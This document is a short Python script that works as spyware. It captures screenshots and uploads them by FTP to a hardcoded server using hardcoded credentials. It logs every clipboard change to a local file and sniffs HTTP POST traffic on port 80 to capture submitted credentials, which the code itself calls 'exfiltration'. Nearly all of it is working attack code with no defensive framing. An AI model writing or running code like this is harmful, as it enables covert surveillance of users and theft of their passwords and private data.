#!/usr/bin/env python
from ftplib import FTP
import pyautogui, os, time, socket, pyperclip
from scapy.all import sniff
from collections import Counter

def connect_ftp():
    ftp = FTP('192.168.35.95', 'toto', 'tata')
    return ftp

def screenshot():
    ftp = connect_ftp()
    timestamp = time.time()
    hostname = socket.gethostname()
    filename = 'screen_' + hostname + '_' + str(timestamp) + '.png'
    ftp.cwd('screenshots')
    image = pyautogui.screenshot()
    image.save(filename)

    file = open(filename, 'rb')
    ftp.storbinary('STOR ' + filename, file)
    file.close()

    os.remove(filename)
    ftp.quit()

def clipboard_exfiltration():
    last_clipboard = ''
    while True:
        get_clipboard = pyperclip.paste()
        if last_clipboard != get_clipboard:
            f = open("clipboard.txt", "a+")
            f.write(get_clipboard + "\n")
            last_clipboard = get_clipboard
            f.close()
        time.sleep(1)


def http_header(packet):
    http_packet = str(packet)
    if http_packet.find('POST'):
        print POST_print(packet)
    print packet

def POST_print(packet1):
    stars = lambda n: "*" * n
    return "\n".join((
        stars(40) + "POST PACKET" + stars(40),
        "\n".join(packet1.sprintf("{Raw:%Raw.load%}").split(r"\r\n")),
        stars(90)))

def creds_exfiltration():
    sniff(
        prn=POST_print,
        lfilter=lambda p: "POST" in str(p),
        filter="tcp port 80")

# def process(packet):
#     http_header = "http_header"
#     return http_header

def main():
    #screenshot()
    #clipboard_exfiltration()
    creds_exfiltration()



if __name__ == '__main__':
    main()
